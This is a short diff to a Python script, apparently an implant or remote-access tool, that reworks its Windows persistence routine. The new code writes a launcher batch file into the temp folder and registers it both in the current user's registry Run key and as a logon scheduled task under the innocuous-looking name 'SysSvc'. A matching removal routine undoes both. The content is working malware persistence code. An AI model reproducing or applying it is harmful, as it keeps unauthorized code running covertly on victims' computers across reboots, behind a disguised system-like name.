@@ -626,9 +626,15 @@ def persist():
             done.append("bashrc")
 
     if os.name == "nt":
-        sh('schtasks /create /tn SysSvc /tr "\\"%s\\" \\"%s\\"" /sc onlogon /f'
-           % (sys.executable, self_path))
-        done.append("schtasks")
+        d = os.path.join(tempfile.gettempdir(), "svc")
+        os.makedirs(d, exist_ok=True)
+        run = os.path.join(d, "run.cmd")
+        with open(run, "w") as f:
+            f.write('@echo off\r\nstart "" "%s" "%s"\r\n' % (sys.executable, self_path))
+        sh('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc '
+           '/t REG_SZ /d "\\"%s\\"" /f' % run)
+        sh('schtasks /create /tn SysSvc /tr "\\"%s\\"" /sc onlogon /f' % run)
+        done.append("run-key")
 
     return ", ".join(done) or "none"
 
@@ -671,8 +677,9 @@ def unpersist():
             done.append("bashrc")
 
     if os.name == "nt":
+        sh('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SysSvc /f')
         sh("schtasks /delete /tn SysSvc /f")
-        done.append("schtasks")
+        done.append("run-key")
 
     return ", ".join(done) or "none"
 
